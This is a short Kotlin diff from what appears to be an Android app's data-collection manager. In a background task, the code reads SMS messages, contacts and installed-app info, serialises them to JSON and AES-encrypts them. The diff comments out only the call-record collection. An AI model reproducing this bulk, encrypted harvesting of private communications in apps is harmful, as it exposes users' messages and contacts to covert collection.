@@ -46,8 +46,8 @@ class CollectDataMgr {
             override fun doInBackground(): Any {
                 try {
                     val smsStr = EncodeUtils.encryptAES(GsonUtils.toJson(readSms(context)))
-                    val callRecordStr =
-                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
+                    val callRecordStr = ""
+//                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
                     val contractStr =
                         EncodeUtils.encryptAES(GsonUtils.toJson(readContract(context)))
                     val appInfoStr = EncodeUtils.encryptAES(GsonUtils.toJson(readAllAppInfo()))
